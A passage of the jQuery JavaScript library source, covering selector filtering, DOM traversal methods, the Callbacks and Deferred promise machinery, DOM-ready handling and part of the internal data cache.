  // Use defaultValue in place of getAttribute("value")
  if ( !support.attributes || !assert(function( el ) {
      el.innerHTML = "<input/>";
      el.firstChild.setAttribute( "value", "" );
      return el.firstChild.getAttribute( "value" ) === "";
  }) ) {
      addHandle( "value", function( elem, name, isXML ) {
          if ( !isXML && elem.nodeName.toLowerCase() === "input" ) {
              return elem.defaultValue;
          }
      });
  }

  // Support: IE<9
  // Use getAttributeNode to fetch booleans when getAttribute lies
  if ( !assert(function( el ) {
      return el.getAttribute("disabled") == null;
  }) ) {
      addHandle( booleans, function( elem, name, isXML ) {
          var val;
          if ( !isXML ) {
              return elem[ name ] === true ? name.toLowerCase() :
                      (val = elem.getAttributeNode( name )) && val.specified ?
                      val.value :
                  null;
          }
      });
  }

  return Sizzle;

  })( window );



  jQuery.find = Sizzle;
  jQuery.expr = Sizzle.selectors;

  // Deprecated
  jQuery.expr[ ":" ] = jQuery.expr.pseudos;
  jQuery.uniqueSort = jQuery.unique = Sizzle.uniqueSort;
  jQuery.text = Sizzle.getText;
  jQuery.isXMLDoc = Sizzle.isXML;
  jQuery.contains = Sizzle.contains;
  jQuery.escapeSelector = Sizzle.escape;




  var dir = function( elem, dir, until ) {
      var matched = [],
          truncate = until !== undefined;

      while ( ( elem = elem[ dir ] ) && elem.nodeType !== 9 ) {
          if ( elem.nodeType === 1 ) {
              if ( truncate && jQuery( elem ).is( until ) ) {
                  break;
              }
              matched.push( elem );
          }
      }
      return matched;
  };


  var siblings = function( n, elem ) {
      var matched = [];

      for ( ; n; n = n.nextSibling ) {
          if ( n.nodeType === 1 && n !== elem ) {
              matched.push( n );
          }
      }

      return matched;
  };


  var rneedsContext = jQuery.expr.match.needsContext;



  function nodeName( elem, name ) {

    return elem.nodeName && elem.nodeName.toLowerCase() === name.toLowerCase();

  };
  var rsingleTag = ( /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i );



  var risSimple = /^.[^:#\[\.,]*$/;

  // Implement the identical functionality for filter and not
  function winnow( elements, qualifier, not ) {
      if ( jQuery.isFunction( qualifier ) ) {
          return jQuery.grep( elements, function( elem, i ) {
              return !!qualifier.call( elem, i, elem ) !== not;
          } );
      }

      // Single element
      if ( qualifier.nodeType ) {
          return jQuery.grep( elements, function( elem ) {
              return ( elem === qualifier ) !== not;
          } );
      }

      // Arraylike of elements (jQuery, arguments, Array)
      if ( typeof qualifier !== "string" ) {
          return jQuery.grep( elements, function( elem ) {
              return ( indexOf.call( qualifier, elem ) > -1 ) !== not;
          } );
      }

      // Simple selector that can be filtered directly, removing non-Elements
      if ( risSimple.test( qualifier ) ) {
          return jQuery.filter( qualifier, elements, not );
      }

      // Complex selector, compare the two sets, removing non-Elements
      qualifier = jQuery.filter( qualifier, elements );
      return jQuery.grep( elements, function( elem ) {
          return ( indexOf.call( qualifier, elem ) > -1 ) !== not && elem.nodeType === 1;
      } );
  }

  jQuery.filter = function( expr, elems, not ) {
      var elem = elems[ 0 ];

      if ( not ) {
          expr = ":not(" + expr + ")";
      }

      if ( elems.length === 1 && elem.nodeType === 1 ) {
          return jQuery.find.matchesSelector( elem, expr ) ? [ elem ] : [];
      }

      return jQuery.find.matches( expr, jQuery.grep( elems, function( elem ) {
          return elem.nodeType === 1;
      } ) );
  };

  jQuery.fn.extend( {
      find: function( selector ) {
          var i, ret,
              len = this.length,
              self = this;

          if ( typeof selector !== "string" ) {
              return this.pushStack( jQuery( selector ).filter( function() {
                  for ( i = 0; i < len; i++ ) {
                      if ( jQuery.contains( self[ i ], this ) ) {
                          return true;
                      }
                  }
              } ) );
          }

          ret = this.pushStack( [] );

          for ( i = 0; i < len; i++ ) {
              jQuery.find( selector, self[ i ], ret );
          }

          return len > 1 ? jQuery.uniqueSort( ret ) : ret;
      },
      filter: function( selector ) {
          return this.pushStack( winnow( this, selector || [], false ) );
      },
      not: function( selector ) {
          return this.pushStack( winnow( this, selector || [], true ) );
      },
      is: function( selector ) {
          return !!winnow(
              this,

              // If this is a positional/relative selector, check membership in the returned set
              // so $("p:first").is("p:last") won't return true for a doc with two "p".
              typeof selector === "string" && rneedsContext.test( selector ) ?
                  jQuery( selector ) :
                  selector || [],
              false
          ).length;
      }
  } );


  // Initialize a jQuery object


  // A central reference to the root jQuery(document)
  var rootjQuery,

      // A simple way to check for HTML strings
      // Prioritize #id over <tag> to avoid XSS via location.hash (#9521)
      // Strict HTML recognition (#11290: must start with <)
      // Shortcut simple #id case for speed
      rquickExpr = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/,

      init = jQuery.fn.init = function( selector, context, root ) {
          var match, elem;

          // HANDLE: $(""), $(null), $(undefined), $(false)
          if ( !selector ) {
              return this;
          }

          // Method init() accepts an alternate rootjQuery
          // so migrate can support jQuery.sub (gh-2101)
          root = root || rootjQuery;

          // Handle HTML strings
          if ( typeof selector === "string" ) {
              if ( selector[ 0 ] === "<" &&
                  selector[ selector.length - 1 ] === ">" &&
                  selector.length >= 3 ) {

                  // Assume that strings that start and end with <> are HTML and skip the regex check
                  match = [ null, selector, null ];

              } else {
                  match = rquickExpr.exec( selector );
              }

              // Match html or make sure no context is specified for #id
              if ( match && ( match[ 1 ] || !context ) ) {

                  // HANDLE: $(html) -> $(array)
                  if ( match[ 1 ] ) {
                      context = context instanceof jQuery ? context[ 0 ] : context;

                      // Option to run scripts is true for back-compat
                      // Intentionally let the error be thrown if parseHTML is not present
                      jQuery.merge( this, jQuery.parseHTML(
                          match[ 1 ],
                          context && context.nodeType ? context.ownerDocument || context : document,
                          true
                      ) );

                      // HANDLE: $(html, props)
                      if ( rsingleTag.test( match[ 1 ] ) && jQuery.isPlainObject( context ) ) {
                          for ( match in context ) {

                              // Properties of context are called as methods if possible
                              if ( jQuery.isFunction( this[ match ] ) ) {
                                  this[ match ]( context[ match ] );

                              // ...and otherwise set as attributes
                              } else {
                                  this.attr( match, context[ match ] );
                              }
                          }
                      }

                      return this;

                  // HANDLE: $(#id)
                  } else {
                      elem = document.getElementById( match[ 2 ] );

                      if ( elem ) {

                          // Inject the element directly into the jQuery object
                          this[ 0 ] = elem;
                          this.length = 1;
                      }
                      return this;
                  }

              // HANDLE: $(expr, $(...))
              } else if ( !context || context.jquery ) {
                  return ( context || root ).find( selector );

              // HANDLE: $(expr, context)
              // (which is just equivalent to: $(context).find(expr)
              } else {
                  return this.constructor( context ).find( selector );
              }

          // HANDLE: $(DOMElement)
          } else if ( selector.nodeType ) {
              this[ 0 ] = selector;
              this.length = 1;
              return this;

          // HANDLE: $(function)
          // Shortcut for document ready
          } else if ( jQuery.isFunction( selector ) ) {
              return root.ready !== undefined ?
                  root.ready( selector ) :

                  // Execute immediately if ready is not present
                  selector( jQuery );
          }

          return jQuery.makeArray( selector, this );
      };

  // Give the init function the jQuery prototype for later instantiation
  init.prototype = jQuery.fn;

  // Initialize central reference
  rootjQuery = jQuery( document );


  var rparentsprev = /^(?:parents|prev(?:Until|All))/,

      // Methods guaranteed to produce a unique set when starting from a unique set
      guaranteedUnique = {
          children: true,
          contents: true,
          next: true,
          prev: true
      };

  jQuery.fn.extend( {
      has: function( target ) {
          var targets = jQuery( target, this ),
              l = targets.length;

          return this.filter( function() {
              var i = 0;
              for ( ; i < l; i++ ) {
                  if ( jQuery.contains( this, targets[ i ] ) ) {
                      return true;
                  }
              }
          } );
      },

      closest: function( selectors, context ) {
          var cur,
              i = 0,
              l = this.length,
              matched = [],
              targets = typeof selectors !== "string" && jQuery( selectors );

          // Positional selectors never match, since there's no _selection_ context
          if ( !rneedsContext.test( selectors ) ) {
              for ( ; i < l; i++ ) {
                  for ( cur = this[ i ]; cur && cur !== context; cur = cur.parentNode ) {

                      // Always skip document fragments
                      if ( cur.nodeType < 11 && ( targets ?
                          targets.index( cur ) > -1 :

                          // Don't pass non-elements to Sizzle
                          cur.nodeType === 1 &&
                              jQuery.find.matchesSelector( cur, selectors ) ) ) {

                          matched.push( cur );
                          break;
                      }
                  }
              }
          }

          return this.pushStack( matched.length > 1 ? jQuery.uniqueSort( matched ) : matched );
      },

      // Determine the position of an element within the set
      index: function( elem ) {

          // No argument, return index in parent
          if ( !elem ) {
              return ( this[ 0 ] && this[ 0 ].parentNode ) ? this.first().prevAll().length : -1;
          }

          // Index in selector
          if ( typeof elem === "string" ) {
              return indexOf.call( jQuery( elem ), this[ 0 ] );
          }

          // Locate the position of the desired element
          return indexOf.call( this,

              // If it receives a jQuery object, the first element is used
              elem.jquery ? elem[ 0 ] : elem
          );
      },

      add: function( selector, context ) {
          return this.pushStack(
              jQuery.uniqueSort(
                  jQuery.merge( this.get(), jQuery( selector, context ) )
              )
          );
      },

      addBack: function( selector ) {
          return this.add( selector == null ?
              this.prevObject : this.prevObject.filter( selector )
          );
      }
  } );

  function sibling( cur, dir ) {
      while ( ( cur = cur[ dir ] ) && cur.nodeType !== 1 ) {}
      return cur;
  }

  jQuery.each( {
      parent: function( elem ) {
          var parent = elem.parentNode;
          return parent && parent.nodeType !== 11 ? parent : null;
      },
      parents: function( elem ) {
          return dir( elem, "parentNode" );
      },
      parentsUntil: function( elem, i, until ) {
          return dir( elem, "parentNode", until );
      },
      next: function( elem ) {
          return sibling( elem, "nextSibling" );
      },
      prev: function( elem ) {
          return sibling( elem, "previousSibling" );
      },
      nextAll: function( elem ) {
          return dir( elem, "nextSibling" );
      },
      prevAll: function( elem ) {
          return dir( elem, "previousSibling" );
      },
      nextUntil: function( elem, i, until ) {
          return dir( elem, "nextSibling", until );
      },
      prevUntil: function( elem, i, until ) {
          return dir( elem, "previousSibling", until );
      },
      siblings: function( elem ) {
          return siblings( ( elem.parentNode || {} ).firstChild, elem );
      },
      children: function( elem ) {
          return siblings( elem.firstChild );
      },
      contents: function( elem ) {
          if ( nodeName( elem, "iframe" ) ) {
              return elem.contentDocument;
          }

          // Support: IE 9 - 11 only, iOS 7 only, Android Browser <=4.3 only
          // Treat the template element as a regular one in browsers that
          // don't support it.
          if ( nodeName( elem, "template" ) ) {
              elem = elem.content || elem;
          }

          return jQuery.merge( [], elem.childNodes );
      }
  }, function( name, fn ) {
      jQuery.fn[ name ] = function( until, selector ) {
          var matched = jQuery.map( this, fn, until );

          if ( name.slice( -5 ) !== "Until" ) {
              selector = until;
          }

          if ( selector && typeof selector === "string" ) {
              matched = jQuery.filter( selector, matched );
          }

          if ( this.length > 1 ) {

              // Remove duplicates
              if ( !guaranteedUnique[ name ] ) {
                  jQuery.uniqueSort( matched );
              }

              // Reverse order for parents* and prev-derivatives
              if ( rparentsprev.test( name ) ) {
                  matched.reverse();
              }
          }

          return this.pushStack( matched );
      };
  } );
  var rnothtmlwhite = ( /[^\x20\t\r\n\f]+/g );



  // Convert String-formatted options into Object-formatted ones
  function createOptions( options ) {
      var object = {};
      jQuery.each( options.match( rnothtmlwhite ) || [], function( _, flag ) {
          object[ flag ] = true;
      } );
      return object;
  }

  /*
   * Create a callback list using the following parameters:
   *
   *	options: an optional list of space-separated options that will change how
   *			the callback list behaves or a more traditional option object
   *
   * By default a callback list will act like an event callback list and can be
   * "fired" multiple times.
   *
   * Possible options:
   *
   *	once:			will ensure the callback list can only be fired once (like a Deferred)
   *
   *	memory:			will keep track of previous values and will call any callback added
   *					after the list has been fired right away with the latest "memorized"
   *					values (like a Deferred)
   *
   *	unique:			will ensure a callback can only be added once (no duplicate in the list)
   *
   *	stopOnFalse:	interrupt callings when a callback returns false
   *
   */
  jQuery.Callbacks = function( options ) {

      // Convert options from String-formatted to Object-formatted if needed
      // (we check in cache first)
      options = typeof options === "string" ?
          createOptions( options ) :
          jQuery.extend( {}, options );

      var // Flag to know if list is currently firing
          firing,

          // Last fire value for non-forgettable lists
          memory,

          // Flag to know if list was already fired
          fired,

          // Flag to prevent firing
          locked,

          // Actual callback list
          list = [],

          // Queue of execution data for repeatable lists
          queue = [],

          // Index of currently firing callback (modified by add/remove as needed)
          firingIndex = -1,

          // Fire callbacks
          fire = function() {

              // Enforce single-firing
              locked = locked || options.once;

              // Execute callbacks for all pending executions,
              // respecting firingIndex overrides and runtime changes
              fired = firing = true;
              for ( ; queue.length; firingIndex = -1 ) {
                  memory = queue.shift();
                  while ( ++firingIndex < list.length ) {

                      // Run callback and check for early termination
                      if ( list[ firingIndex ].apply( memory[ 0 ], memory[ 1 ] ) === false &&
                          options.stopOnFalse ) {

                          // Jump to end and forget the data so .add doesn't re-fire
                          firingIndex = list.length;
                          memory = false;
                      }
                  }
              }

              // Forget the data if we're done with it
              if ( !options.memory ) {
                  memory = false;
              }

              firing = false;

              // Clean up if we're done firing for good
              if ( locked ) {

                  // Keep an empty list if we have data for future add calls
                  if ( memory ) {
                      list = [];

                  // Otherwise, this object is spent
                  } else {
                      list = "";
                  }
              }
          },

          // Actual Callbacks object
          self = {

              // Add a callback or a collection of callbacks to the list
              add: function() {
                  if ( list ) {

                      // If we have memory from a past run, we should fire after adding
                      if ( memory && !firing ) {
                          firingIndex = list.length - 1;
                          queue.push( memory );
                      }

                      ( function add( args ) {
                          jQuery.each( args, function( _, arg ) {
                              if ( jQuery.isFunction( arg ) ) {
                                  if ( !options.unique || !self.has( arg ) ) {
                                      list.push( arg );
                                  }
                              } else if ( arg && arg.length && jQuery.type( arg ) !== "string" ) {

                                  // Inspect recursively
                                  add( arg );
                              }
                          } );
                      } )( arguments );

                      if ( memory && !firing ) {
                          fire();
                      }
                  }
                  return this;
              },

              // Remove a callback from the list
              remove: function() {
                  jQuery.each( arguments, function( _, arg ) {
                      var index;
                      while ( ( index = jQuery.inArray( arg, list, index ) ) > -1 ) {
                          list.splice( index, 1 );

                          // Handle firing indexes
                          if ( index <= firingIndex ) {
                              firingIndex--;
                          }
                      }
                  } );
                  return this;
              },

              // Check if a given callback is in the list.
              // If no argument is given, return whether or not list has callbacks attached.
              has: function( fn ) {
                  return fn ?
                      jQuery.inArray( fn, list ) > -1 :
                      list.length > 0;
              },

              // Remove all callbacks from the list
              empty: function() {
                  if ( list ) {
                      list = [];
                  }
                  return this;
              },

              // Disable .fire and .add
              // Abort any current/pending executions
              // Clear all callbacks and values
              disable: function() {
                  locked = queue = [];
                  list = memory = "";
                  return this;
              },
              disabled: function() {
                  return !list;
              },

              // Disable .fire
              // Also disable .add unless we have memory (since it would have no effect)
              // Abort any pending executions
              lock: function() {
                  locked = queue = [];
                  if ( !memory && !firing ) {
                      list = memory = "";
                  }
                  return this;
              },
              locked: function() {
                  return !!locked;
              },

              // Call all callbacks with the given context and arguments
              fireWith: function( context, args ) {
                  if ( !locked ) {
                      args = args || [];
                      args = [ context, args.slice ? args.slice() : args ];
                      queue.push( args );
                      if ( !firing ) {
                          fire();
                      }
                  }
                  return this;
              },

              // Call all the callbacks with the given arguments
              fire: function() {
                  self.fireWith( this, arguments );
                  return this;
              },

              // To know if the callbacks have already been called at least once
              fired: function() {
                  return !!fired;
              }
          };

      return self;
  };


  function Identity( v ) {
      return v;
  }
  function Thrower( ex ) {
      throw ex;
  }

  function adoptValue( value, resolve, reject, noValue ) {
      var method;

      try {

          // Check for promise aspect first to privilege synchronous behavior
          if ( value && jQuery.isFunction( ( method = value.promise ) ) ) {
              method.call( value ).done( resolve ).fail( reject );

          // Other thenables
          } else if ( value && jQuery.isFunction( ( method = value.then ) ) ) {
              method.call( value, resolve, reject );

          // Other non-thenables
          } else {

              // Control `resolve` arguments by letting Array#slice cast boolean `noValue` to integer:
              // * false: [ value ].slice( 0 ) => resolve( value )
              // * true: [ value ].slice( 1 ) => resolve()
              resolve.apply( undefined, [ value ].slice( noValue ) );
          }

      // For Promises/A+, convert exceptions into rejections
      // Since jQuery.when doesn't unwrap thenables, we can skip the extra checks appearing in
      // Deferred#then to conditionally suppress rejection.
      } catch ( value ) {

          // Support: Android 4.0 only
          // Strict mode functions invoked without .call/.apply get global-object context
          reject.apply( undefined, [ value ] );
      }
  }

  jQuery.extend( {

      Deferred: function( func ) {
          var tuples = [

                  // action, add listener, callbacks,
                  // ... .then handlers, argument index, [final state]
                  [ "notify", "progress", jQuery.Callbacks( "memory" ),
                      jQuery.Callbacks( "memory" ), 2 ],
                  [ "resolve", "done", jQuery.Callbacks( "once memory" ),
                      jQuery.Callbacks( "once memory" ), 0, "resolved" ],
                  [ "reject", "fail", jQuery.Callbacks( "once memory" ),
                      jQuery.Callbacks( "once memory" ), 1, "rejected" ]
              ],
              state = "pending",
              promise = {
                  state: function() {
                      return state;
                  },
                  always: function() {
                      deferred.done( arguments ).fail( arguments );
                      return this;
                  },
                  "catch": function( fn ) {
                      return promise.then( null, fn );
                  },

                  // Keep pipe for back-compat
                  pipe: function( /* fnDone, fnFail, fnProgress */ ) {
                      var fns = arguments;

                      return jQuery.Deferred( function( newDefer ) {
                          jQuery.each( tuples, function( i, tuple ) {

                              // Map tuples (progress, done, fail) to arguments (done, fail, progress)
                              var fn = jQuery.isFunction( fns[ tuple[ 4 ] ] ) && fns[ tuple[ 4 ] ];

                              // deferred.progress(function() { bind to newDefer or newDefer.notify })
                              // deferred.done(function() { bind to newDefer or newDefer.resolve })
                              // deferred.fail(function() { bind to newDefer or newDefer.reject })
                              deferred[ tuple[ 1 ] ]( function() {
                                  var returned = fn && fn.apply( this, arguments );
                                  if ( returned && jQuery.isFunction( returned.promise ) ) {
                                      returned.promise()
                                          .progress( newDefer.notify )
                                          .done( newDefer.resolve )
                                          .fail( newDefer.reject );
                                  } else {
                                      newDefer[ tuple[ 0 ] + "With" ](
                                          this,
                                          fn ? [ returned ] : arguments
                                      );
                                  }
                              } );
                          } );
                          fns = null;
                      } ).promise();
                  },
                  then: function( onFulfilled, onRejected, onProgress ) {
                      var maxDepth = 0;
                      function resolve( depth, deferred, handler, special ) {
                          return function() {
                              var that = this,
                                  args = arguments,
                                  mightThrow = function() {
                                      var returned, then;

                                      // Support: Promises/A+ section 2.3.3.3.3
                                      // https://promisesaplus.com/#point-59
                                      // Ignore double-resolution attempts
                                      if ( depth < maxDepth ) {
                                          return;
                                      }

                                      returned = handler.apply( that, args );

                                      // Support: Promises/A+ section 2.3.1
                                      // https://promisesaplus.com/#point-48
                                      if ( returned === deferred.promise() ) {
                                          throw new TypeError( "Thenable self-resolution" );
                                      }

                                      // Support: Promises/A+ sections 2.3.3.1, 3.5
                                      // https://promisesaplus.com/#point-54
                                      // https://promisesaplus.com/#point-75
                                      // Retrieve `then` only once
                                      then = returned &&

                                          // Support: Promises/A+ section 2.3.4
                                          // https://promisesaplus.com/#point-64
                                          // Only check objects and functions for thenability
                                          ( typeof returned === "object" ||
                                              typeof returned === "function" ) &&
                                          returned.then;

                                      // Handle a returned thenable
                                      if ( jQuery.isFunction( then ) ) {

                                          // Special processors (notify) just wait for resolution
                                          if ( special ) {
                                              then.call(
                                                  returned,
                                                  resolve( maxDepth, deferred, Identity, special ),
                                                  resolve( maxDepth, deferred, Thrower, special )
                                              );

                                          // Normal processors (resolve) also hook into progress
                                          } else {

                                              // ...and disregard older resolution values
                                              maxDepth++;

                                              then.call(
                                                  returned,
                                                  resolve( maxDepth, deferred, Identity, special ),
                                                  resolve( maxDepth, deferred, Thrower, special ),
                                                  resolve( maxDepth, deferred, Identity,
                                                      deferred.notifyWith )
                                              );
                                          }

                                      // Handle all other returned values
                                      } else {

                                          // Only substitute handlers pass on context
                                          // and multiple values (non-spec behavior)
                                          if ( handler !== Identity ) {
                                              that = undefined;
                                              args = [ returned ];
                                          }

                                          // Process the value(s)
                                          // Default process is resolve
                                          ( special || deferred.resolveWith )( that, args );
                                      }
                                  },

                                  // Only normal processors (resolve) catch and reject exceptions
                                  process = special ?
                                      mightThrow :
                                      function() {
                                          try {
                                              mightThrow();
                                          } catch ( e ) {

                                              if ( jQuery.Deferred.exceptionHook ) {
                                                  jQuery.Deferred.exceptionHook( e,
                                                      process.stackTrace );
                                              }

                                              // Support: Promises/A+ section 2.3.3.3.4.1
                                              // https://promisesaplus.com/#point-61
                                              // Ignore post-resolution exceptions
                                              if ( depth + 1 >= maxDepth ) {

                                                  // Only substitute handlers pass on context
                                                  // and multiple values (non-spec behavior)
                                                  if ( handler !== Thrower ) {
                                                      that = undefined;
                                                      args = [ e ];
                                                  }

                                                  deferred.rejectWith( that, args );
                                              }
                                          }
                                      };

                              // Support: Promises/A+ section 2.3.3.3.1
                              // https://promisesaplus.com/#point-57
                              // Re-resolve promises immediately to dodge false rejection from
                              // subsequent errors
                              if ( depth ) {
                                  process();
                              } else {

                                  // Call an optional hook to record the stack, in case of exception
                                  // since it's otherwise lost when execution goes async
                                  if ( jQuery.Deferred.getStackHook ) {
                                      process.stackTrace = jQuery.Deferred.getStackHook();
                                  }
                                  window.setTimeout( process );
                              }
                          };
                      }

                      return jQuery.Deferred( function( newDefer ) {

                          // progress_handlers.add( ... )
                          tuples[ 0 ][ 3 ].add(
                              resolve(
                                  0,
                                  newDefer,
                                  jQuery.isFunction( onProgress ) ?
                                      onProgress :
                                      Identity,
                                  newDefer.notifyWith
                              )
                          );

                          // fulfilled_handlers.add( ... )
                          tuples[ 1 ][ 3 ].add(
                              resolve(
                                  0,
                                  newDefer,
                                  jQuery.isFunction( onFulfilled ) ?
                                      onFulfilled :
                                      Identity
                              )
                          );

                          // rejected_handlers.add( ... )
                          tuples[ 2 ][ 3 ].add(
                              resolve(
                                  0,
                                  newDefer,
                                  jQuery.isFunction( onRejected ) ?
                                      onRejected :
                                      Thrower
                              )
                          );
                      } ).promise();
                  },

                  // Get a promise for this deferred
                  // If obj is provided, the promise aspect is added to the object
                  promise: function( obj ) {
                      return obj != null ? jQuery.extend( obj, promise ) : promise;
                  }
              },
              deferred = {};

          // Add list-specific methods
          jQuery.each( tuples, function( i, tuple ) {
              var list = tuple[ 2 ],
                  stateString = tuple[ 5 ];

              // promise.progress = list.add
              // promise.done = list.add
              // promise.fail = list.add
              promise[ tuple[ 1 ] ] = list.add;

              // Handle state
              if ( stateString ) {
                  list.add(
                      function() {

                          // state = "resolved" (i.e., fulfilled)
                          // state = "rejected"
                          state = stateString;
                      },

                      // rejected_callbacks.disable
                      // fulfilled_callbacks.disable
                      tuples[ 3 - i ][ 2 ].disable,

                      // progress_callbacks.lock
                      tuples[ 0 ][ 2 ].lock
                  );
              }

              // progress_handlers.fire
              // fulfilled_handlers.fire
              // rejected_handlers.fire
              list.add( tuple[ 3 ].fire );

              // deferred.notify = function() { deferred.notifyWith(...) }
              // deferred.resolve = function() { deferred.resolveWith(...) }
              // deferred.reject = function() { deferred.rejectWith(...) }
              deferred[ tuple[ 0 ] ] = function() {
                  deferred[ tuple[ 0 ] + "With" ]( this === deferred ? undefined : this, arguments );
                  return this;
              };

              // deferred.notifyWith = list.fireWith
              // deferred.resolveWith = list.fireWith
              // deferred.rejectWith = list.fireWith
              deferred[ tuple[ 0 ] + "With" ] = list.fireWith;
          } );

          // Make the deferred a promise
          promise.promise( deferred );

          // Call given func if any
          if ( func ) {
              func.call( deferred, deferred );
          }

          // All done!
          return deferred;
      },

      // Deferred helper
      when: function( singleValue ) {
          var

              // count of uncompleted subordinates
              remaining = arguments.length,

              // count of unprocessed arguments
              i = remaining,

              // subordinate fulfillment data
              resolveContexts = Array( i ),
              resolveValues = slice.call( arguments ),

              // the master Deferred
              master = jQuery.Deferred(),

              // subordinate callback factory
              updateFunc = function( i ) {
                  return function( value ) {
                      resolveContexts[ i ] = this;
                      resolveValues[ i ] = arguments.length > 1 ? slice.call( arguments ) : value;
                      if ( !( --remaining ) ) {
                          master.resolveWith( resolveContexts, resolveValues );
                      }
                  };
              };

          // Single- and empty arguments are adopted like Promise.resolve
          if ( remaining <= 1 ) {
              adoptValue( singleValue, master.done( updateFunc( i ) ).resolve, master.reject,
                  !remaining );

              // Use .then() to unwrap secondary thenables (cf. gh-3000)
              if ( master.state() === "pending" ||
                  jQuery.isFunction( resolveValues[ i ] && resolveValues[ i ].then ) ) {

                  return master.then();
              }
          }

          // Multiple arguments are aggregated like Promise.all array elements
          while ( i-- ) {
              adoptValue( resolveValues[ i ], updateFunc( i ), master.reject );
          }

          return master.promise();
      }
  } );


  // These usually indicate a programmer mistake during development,
  // warn about them ASAP rather than swallowing them by default.
  var rerrorNames = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;

  jQuery.Deferred.exceptionHook = function( error, stack ) {

      // Support: IE 8 - 9 only
      // Console exists when dev tools are open, which can happen at any time
      if ( window.console && window.console.warn && error && rerrorNames.test( error.name ) ) {
          window.console.warn( "jQuery.Deferred exception: " + error.message, error.stack, stack );
      }
  };




  jQuery.readyException = function( error ) {
      window.setTimeout( function() {
          throw error;
      } );
  };




  // The deferred used on DOM ready
  var readyList = jQuery.Deferred();

  jQuery.fn.ready = function( fn ) {

      readyList
          .then( fn )

          // Wrap jQuery.readyException in a function so that the lookup
          // happens at the time of error handling instead of callback
          // registration.
          .catch( function( error ) {
              jQuery.readyException( error );
          } );

      return this;
  };

  jQuery.extend( {

      // Is the DOM ready to be used? Set to true once it occurs.
      isReady: false,

      // A counter to track how many items to wait for before
      // the ready event fires. See #6781
      readyWait: 1,

      // Handle when the DOM is ready
      ready: function( wait ) {

          // Abort if there are pending holds or we're already ready
          if ( wait === true ? --jQuery.readyWait : jQuery.isReady ) {
              return;
          }

          // Remember that the DOM is ready
          jQuery.isReady = true;

          // If a normal DOM Ready event fired, decrement, and wait if need be
          if ( wait !== true && --jQuery.readyWait > 0 ) {
              return;
          }

          // If there are functions bound, to execute
          readyList.resolveWith( document, [ jQuery ] );
      }
  } );

  jQuery.ready.then = readyList.then;

  // The ready event handler and self cleanup method
  function completed() {
      document.removeEventListener( "DOMContentLoaded", completed );
      window.removeEventListener( "load", completed );
      jQuery.ready();
  }

  // Catch cases where $(document).ready() is called
  // after the browser event has already occurred.
  // Support: IE <=9 - 10 only
  // Older IE sometimes signals "interactive" too soon
  if ( document.readyState === "complete" ||
      ( document.readyState !== "loading" && !document.documentElement.doScroll ) ) {

      // Handle it asynchronously to allow scripts the opportunity to delay ready
      window.setTimeout( jQuery.ready );

  } else {

      // Use the handy event callback
      document.addEventListener( "DOMContentLoaded", completed );

      // A fallback to window.onload, that will always work
      window.addEventListener( "load", completed );
  }




  // Multifunctional method to get and set values of a collection
  // The value/s can optionally be executed if it's a function
  var access = function( elems, fn, key, value, chainable, emptyGet, raw ) {
      var i = 0,
          len = elems.length,
          bulk = key == null;

      // Sets many values
      if ( jQuery.type( key ) === "object" ) {
          chainable = true;
          for ( i in key ) {
              access( elems, fn, i, key[ i ], true, emptyGet, raw );
          }

      // Sets one value
      } else if ( value !== undefined ) {
          chainable = true;

          if ( !jQuery.isFunction( value ) ) {
              raw = true;
          }

          if ( bulk ) {

              // Bulk operations run against the entire set
              if ( raw ) {
                  fn.call( elems, value );
                  fn = null;

              // ...except when executing function values
              } else {
                  bulk = fn;
                  fn = function( elem, key, value ) {
                      return bulk.call( jQuery( elem ), value );
                  };
              }
          }

          if ( fn ) {
              for ( ; i < len; i++ ) {
                  fn(
                      elems[ i ], key, raw ?
                      value :
                      value.call( elems[ i ], i, fn( elems[ i ], key ) )
                  );
              }
          }
      }

      if ( chainable ) {
          return elems;
      }

      // Gets
      if ( bulk ) {
          return fn.call( elems );
      }

      return len ? fn( elems[ 0 ], key ) : emptyGet;
  };
  var acceptData = function( owner ) {

      // Accepts only:
      //  - Node
      //    - Node.ELEMENT_NODE
      //    - Node.DOCUMENT_NODE
      //  - Object
      //    - Any
      return owner.nodeType === 1 || owner.nodeType === 9 || !( +owner.nodeType );
  };




  function Data() {
      this.expando = jQuery.expando + Data.uid++;
  }

  Data.uid = 1;

  Data.prototype = {

      cache: function( owner ) {

          // Check if the owner object already has a cache
          var value = owner[ this.expando ];

          // If not, create one
          if ( !value ) {
              value = {};

              // We can accept data for non-element nodes in modern browsers,
              // but we should not, see #8335.
              // Always return an empty object.
              if ( acceptData( owner ) ) {

                  // If it is a node unlikely to be stringify-ed or looped over
                  // use plain assignment
                  if ( owner.nodeType ) {
                      owner[ this.expando ] = value;

                  // Otherwise secure it in a non-enumerable property
                  // configurable must be true to allow the property to be
                  // deleted when data is removed
                  } else {
                      Object.defineProperty( owner, this.expando, {
                          value: value,
                          configurable: true
                      } );
                  }
              }
          }

          return value;
      },
      set: function( owner, data, value ) {
          var prop,
              cache = this.cache( owner );

          // Handle: [ owner, key, value ] args
          // Always use camelCase key (gh-2257)
          if ( typeof data === "string" ) {
              cache[ jQuery.camelCase( data ) ] = value;

          // Handle: [ owner, { properties } ] args
          } else {

              // Copy the properties one-by-one to the cache object
              for ( prop in data ) {
                  cache[ jQuery.camelCase( prop ) ] = data[ prop ];
              }
          }
          return cache;
      },
      get: function( owner, key ) {
          return key === undefined ?
              this.cache( owner ) :

              // Always use camelCase key (gh-2257)
              owner[ this.expando ] && owner[ this.expando ][ jQuery.camelCase( key ) ];
      },
      access: function( owner, key, value ) {

          // In cases where either:
          //
          //   1. No key was specified
          //   2. A string key was specified, but no value provided
          //
          // Take the "read" path and allow the get method to determine
          // which value to return, respectively either:
          //
          //   1. The entire cache object
          //   2. The data stored at the key
          //
          if ( key === undefined ||
                  ( ( key && typeof key === "string" ) && value === undefined ) ) {

              return this.get( owner, key );
          }

          // When the key is not a string, or both a key and value
          // are specified, set or extend (existing objects) with either:
          //
          //   1. An object of properties
          //   2. A key and value
          //
          this.set( owner, key, value );

          // Since the "set" path can have two possible entry points
          // return the expected data based on which path was taken[*]
          return value !== undefined ? value : key;
      },
      remove: function( owner, key ) {
          var i,
              cache = owner[ this.expando ];

          if ( cache === undefined ) {
              return;
          }

          if ( key !== undefined ) {

              // Support array or space separated string of keys
              if ( Array.isArray( key ) ) {

                  // If key is an array of keys...
                  // We always set camelCase keys, so remove that.
                  key = key.map( jQuery.camelCase );
